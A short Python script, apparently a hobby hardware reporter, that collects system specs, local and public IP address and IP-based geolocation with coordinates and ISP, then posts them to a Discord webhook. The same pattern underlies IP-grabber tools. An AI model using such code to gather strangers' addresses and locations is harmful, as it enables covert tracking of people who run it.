import platform
import psutil
import socket
import requests
from datetime import datetime
import subprocess

WEBHOOK_URL = "Put your discord webhook here"


def get_cpu():
    system = platform.system()

    if system == "Windows":
        try:
            import wmi
            w = wmi.WMI()
            for cpu in w.Win32_Processor():
                return cpu.Name.strip()
        except:
            return "CPU info not available (WMI error)"

    elif system == "Linux":
        try:
            out = subprocess.check_output("lscpu", shell=True).decode()
            for line in out.split("\n"):
                if "Model name:" in line:
                    return line.split(":")[1].strip()
            return "CPU info not found"
        except:
            return "CPU info not available"

    elif system == "Darwin":
        try:
            out = subprocess.check_output(
                "sysctl -n machdep.cpu.brand_string", shell=True
            ).decode()
            return out.strip()
        except:
            return "CPU info not available"

    return "Unknown CPU"

def get_gpu():
    system = platform.system()

    if system == "Windows":
        try:
            import wmi
            w = wmi.WMI()
            gpus = w.Win32_VideoController()
            names = [gpu.Name.strip() for gpu in gpus if gpu.Name]
            return ", ".join(names)
        except:
            return "GPU detection failed"

    elif system == "Linux":
        try:
            output = subprocess.check_output("lspci | grep -i vga", shell=True).decode()
            return output.strip()
        except:
            return "GPU info not available"

    elif system == "Darwin":
        try:
            output = subprocess.check_output(
                "system_profiler SPDisplaysDataType", shell=True
            ).decode()
            return output.strip()
        except:
            return "GPU info not available"

    return "Unknown GPU"

def get_local_ip():
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "Unknown"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Unavailable"

def get_location():
    try:
        r = requests.get("http://ip-api.com/json/").json()
        if r.get("status") == "success":
            city = r.get("city", "Unknown")
            region = r.get("regionName", "Unknown")
            country = r.get("country", "Unknown")
            isp = r.get("isp", "Unknown")
            lat = r.get("lat", "Unknown")
            lon = r.get("lon", "Unknown")
            return f"{city}, {region}, {country} | ISP: {isp} | Lat: {lat}, Lon: {lon}"
        else:
            return "Location not available"
    except:
        return "Error getting location"

def build_embed():
    embed = {
        "title": "PC Hardware Report",
        "color": 65433,
        "fields": [
            {"name": "CPU", "value": get_cpu(), "inline": False},
            {"name": "GPU", "value": get_gpu(), "inline": False},
            {
                "name": "RAM",
                "value": f"{psutil.virtual_memory().total // (1024**3)} GB",
                "inline": True,
            },
            {
                "name": "Disk",
                "value": f"{psutil.disk_usage('/').total // (1024**3)} GB",
                "inline": True,
            },
            {"name": "Local IP", "value": get_local_ip(), "inline": True},
            {"name": "Public IP", "value": get_public_ip(), "inline": True},
            {"name": "Location", "value": get_location(), "inline": False},
            {
                "name": "Time",
                "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "inline": False,
            },
        ],
    }
    return embed

def send_report():
    payload = {"username": "PC Reporter", "embeds": [build_embed()]}
    requests.post(WEBHOOK_URL, json=payload)

if __name__ == "__main__":
    send_report()
    print("Done")
